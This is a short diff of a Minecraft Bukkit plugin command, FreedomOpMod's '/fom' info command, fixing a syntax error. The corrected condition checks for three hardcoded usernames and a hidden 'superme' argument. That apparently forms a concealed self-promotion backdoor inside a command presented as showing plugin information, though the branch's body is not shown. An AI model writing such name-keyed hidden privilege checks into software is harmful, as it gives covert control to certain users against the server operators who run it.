@@ -10,8 +10,7 @@ import org.bukkit.entity.Player;
 
 @CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
 @CommandParameters(description = "Shows information about FreedomOpMod", usage = "/<command>")
-public class Command_fom
-  extends TFM_Command
+public class Command_fom extends TFM_Command
 {
   public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
   {
@@ -24,7 +23,7 @@ public class Command_fom
     }
     else if (args.length == 1)
     {
-      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8")) || sender_p.getName().equals("SupItsDillon"))
+      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8") || sender_p.getName().equals("SupItsDillon"))
       {
         if (args[0].equals("superme"))
         {
